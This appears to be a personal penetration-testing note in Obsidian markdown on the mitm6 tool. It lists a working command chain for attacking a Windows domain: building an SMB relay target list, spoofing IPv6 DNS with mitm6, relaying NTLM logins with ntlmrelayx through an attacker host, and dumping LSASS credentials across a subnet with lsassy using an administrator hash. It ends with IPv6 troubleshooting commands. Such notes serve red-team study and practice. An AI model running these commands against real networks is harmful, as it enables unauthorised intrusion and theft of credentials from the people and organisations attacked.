---
creation date: November 29th 2021
last modified date: November 29th 2021
aliases: []
tags: #📖
---

Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: {Add link(s) [[]] to related terms}
Search Tag: #📖  

# [[mitm6.py]]  
---

## Get a Relay List 
```bash 
cme smb 1.1.1.1/24 --gen-relay-list relays.txt 

mitm6.py -i eth0 -d attacker.domain.local

ntlmrelayx.py -6 -wh $attacker_ip -of loot -tf relays.txt -smb2support

lsassy -d localhost -u administrator -H REDACTED 192.168.1.0/24 -o lsassyout.txt 

cat lsassyout.txt 
```

## Troubleshoot

### Enable IPv6 Link Local Address

```bash
sysctl -w net.ipv6.conf.eth0.disable_ipv6=0
ip -6 addr flush dev eth0 scope link
sysctl net.ipv6.conf.eth0.addr_gen_mode=0
sysctl net.ipv6.conf.eth0.addr_gen_mode=1
```
May also need to edit `/etc/sysctl.conf`
___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: November 29th 2021 (02:02 pm)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
